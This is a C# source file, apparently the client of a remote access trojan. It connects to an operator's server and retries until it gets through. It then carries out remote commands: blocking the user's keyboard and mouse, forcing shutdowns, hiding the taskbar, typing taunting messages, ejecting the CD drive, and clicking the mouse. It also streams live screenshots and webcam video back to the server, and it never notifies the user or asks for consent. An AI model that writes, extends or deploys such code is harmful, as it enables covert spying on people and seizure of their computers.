using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Speech.Synthesis;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
// webcam
using AForge.Video;
using AForge.Video.DirectShow;


namespace client
{
    class client
    {
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);

        private const int MOUSEEVENTF_MOVE = 0x0001;
        private const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const int MOUSEEVENTF_LEFTUP = 0x0004;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const int MOUSEEVENTF_RIGHTUP = 0x0010;
        private const int MOUSEEVENTF_ABSOLUTE = 0x8000;

        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        [DllImport("User32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

        openCD cd = new openCD();
        private FilterInfoCollection VideoCaptureDevices;
        private VideoCaptureDevice FinalVideo;
        bool wc = false;
        bool rd = false;
        private TcpClient _client;

        private StreamReader _sReader;
        private StreamWriter _sWriter;

        private Boolean _isConnected;

        [DllImport("User32.dll")]
        static extern int SetForegroundWindow(IntPtr point);

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        string[] dataTab;

        public client(String ipAddress, int portNum)
        {
           
            _client = new TcpClient();
            while (!_client.Connected)
            {
                try
                {
                    _client.Connect(ipAddress, portNum);
                }
                catch
                {

                }
                
            }
            

            HandleCommunication();
        }

        public void HandleCommunication()
        {
            _sReader = new StreamReader(_client.GetStream(), Encoding.ASCII);
            _sWriter = new StreamWriter(_client.GetStream(), Encoding.ASCII);

            _isConnected = true;
            String sData = null;
            while (_client.Connected)
            {
                //Console.Write("&gt; ");
                //sData = Console.ReadLine();

                // write data and make sure to flush, or the buffer will continue to 
                // grow, and your data might not be sent when you want it, and will
                // only be sent once the buffer is filled.
                //_sWriter.WriteLine(sData);
                //_sWriter.Flush();

                // if you want to receive anything
                String sDataIncomming = null;
                try
                {
                    sDataIncomming = _sReader.ReadLine();
                    dataTab = new string[1];
                    dataTab = sDataIncomming.Split('_');
                    if (dataTab[1] == "1")
                    {
                        MessageBox.Show(dataTab[0], "server", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                    if (dataTab[1] == "2")
                    {
                        SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                        synthesizer.Volume = 70;
                        synthesizer.SpeakAsync(dataTab[0]);

                    }
                    if(dataTab[1] == "5")
                    {
                        if(dataTab[0] == "true")
                        {
                            BlockInput(true);
                        }
                        else
                        {
                            BlockInput(false);
                        }
                    }
                    if (dataTab[1] == "7")
                    {
                        Process.Start("shutdown.exe", "-s -t 0");
                    }
                    if (dataTab[1] == "8")
                    {
                        Process.Start("shutdown.exe", "-r -t 0");
                    }
                    if (dataTab[1] == "9")
                    {
                        Process.Start("shutdown.exe", "-l -t 0");
                    }
                    if (dataTab[1] == "10")
                    {
                        int hwnd = FindWindow("Shell_TrayWnd", "");
                        ShowWindow(hwnd, SW_HIDE);
                    }
                    if (dataTab[1] == "11")
                    {
                        int hwnd = FindWindow("Shell_TrayWnd", "");
                        ShowWindow(hwnd, SW_SHOW);
                    }
                    if (dataTab[1] == "12")
                    {
                        rd = true;
                        Thread tRD = new Thread(startRD);
                        tRD.Start();
                    }
                    if (dataTab[1] == "13")
                    {
                        rd = false;
                    }
                    if (dataTab[1] == "14")
                    {
                        wc = true;
                        Thread WC = new Thread(() => startWebCam(dataTab[0]));
                        WC.Start();
                    }
                    if (dataTab[1] == "15")
                    {
                        wc = false;
                        stopWebcam();
                    }
                    if (dataTab[1] == "16")
                    {
                        string webcamNames = null;
                        VideoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        foreach (FilterInfo VideoCaptureDevice in VideoCaptureDevices)
                        {
                            webcamNames += VideoCaptureDevice.Name + "_";
                        }
                        _sWriter.WriteLine(webcamNames);
                        _sWriter.Flush();
                    }
                    if(dataTab[1] == "17")
                    {
                        Process p = Process.Start("notepad.exe");
                        p.WaitForInputIdle();
                        IntPtr h = p.MainWindowHandle;
                        SetForegroundWindow(h);
                        try
                        {
                            for (int i = 0; i < dataTab[0].Length; i++)
                            {
                                SendKeys.SendWait(dataTab[0][i].ToString());
                                Thread.Sleep(50);
                            }
                        }
                        catch
                        {
                            
                            SendKeys.SendWait("Hello men, i see you");
                        }
                        
                    }
                    if(dataTab[1] == "18")
                    {
                        try
                        {
                            foreach (DriveInfo drive in DriveInfo.GetDrives())
                            {
                                if (drive.DriveType == DriveType.CDRom)
                                    cd.openDrive(drive.RootDirectory.ToString());
                            }
                        }
                        catch
                        {

                        }
                        
                    }
                    if(dataTab[1] == "19")
                    {
                        try
                        {
                            foreach (DriveInfo drive in DriveInfo.GetDrives())
                            {
                                if (drive.DriveType == DriveType.CDRom)
                                    cd.closeDrive(drive.RootDirectory.ToString());
                            }
                        }
                        catch
                        {

                        }
                    }
                    //if (dataTab[1] == "20")
                    //{
                        MouseClick(false);
                    //}
                    if (dataTab[1] == "21")
                    {
                        MouseClick(true);
                    }
                }
                catch
                {
                    //Application.Restart();
                }


            }
        }
        public void MouseClick(bool doubleClick)
        {
            try
            {
                //W509/H336
                int WidthScreen = Screen.PrimaryScreen.Bounds.Width;
                int HeightScreen = Screen.PrimaryScreen.Bounds.Height;

                string[] strCord = new string[2];
                strCord = dataTab[0].Split(',');

                //string[] strServerScreenSize = new string[1];
                //strServerScreenSize = strCord[2].Split('_');

                int serverScreenWidth = 509;// Convert.ToInt32(strServerScreenSize[0]);
                int serverScreenHeight = 336;// Convert.ToInt32(strServerScreenSize[1]);

                int iXdiv = Convert.ToInt32(WidthScreen / serverScreenWidth);
                Decimal test = WidthScreen / serverScreenWidth;
                Decimal testResult = test* Convert.ToInt32(strCord[0]);
                int iYdiv = Convert.ToInt32(HeightScreen / serverScreenHeight);
                int iXcord = iXdiv * Convert.ToInt32(strCord[0]);
                int iYcord = iYdiv * Convert.ToInt32(strCord[1]);
                //Console.WriteLine("valeur X client écran : {0}\nvaleur Y client écran  : {1}\nvaleur X serveur : {2}\nvaleur Y serveur : {3}\nvaleur X final : {4}\nvaleur Y final : {5}",WidthScreen.ToString(),HeightScreen.ToString(),strCord[0],strCord[1],iXcord.ToString(),iYcord.ToString());
                SetCursorPos(iXcord, iYcord);
                if(doubleClick)
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    Thread.Sleep(50);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                }
                else
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                }
               

            }
            catch(Exception e)
            {
                MessageBox.Show(e.ToString());
            }
        }
        public void startWebCam(string webcam)
        {

            FinalVideo = new VideoCaptureDevice(VideoCaptureDevices[Convert.ToInt32(webcam)].MonikerString);
            FinalVideo.NewFrame += new NewFrameEventHandler(FinalVideo_NewFrame);
            FinalVideo.Start();
            
        }
        public void stopWebcam()
        {
            FinalVideo.Stop();
        }
        void FinalVideo_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
           
                Bitmap video = (Bitmap)eventArgs.Frame.Clone();
                BinaryFormatter binFormatterWebcam = new BinaryFormatter();
                NetworkStream nStreamWeb = _client.GetStream();
                binFormatterWebcam.Serialize(nStreamWeb, video);

            

        }
        public void startRD()
        {
            while(rd)
            {
                BinaryFormatter binFormatter = new BinaryFormatter();
                NetworkStream nStream = _client.GetStream();
                binFormatter.Serialize(nStream, Screenshot());
            }

        }
        public Image Screenshot()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            // Save the screenshot to the specified path that the user has chosen.
            //bmpScreenshot.Save("Screenshot.png", ImageFormat.Png);
            return bmpScreenshot;
            
        }

        static byte[] ImageToByte(System.Drawing.Image iImage)
        {
            MemoryStream mMemoryStream = new MemoryStream();
            iImage.Save(mMemoryStream, System.Drawing.Imaging.ImageFormat.Png);
            return mMemoryStream.ToArray();
        }

    }
}
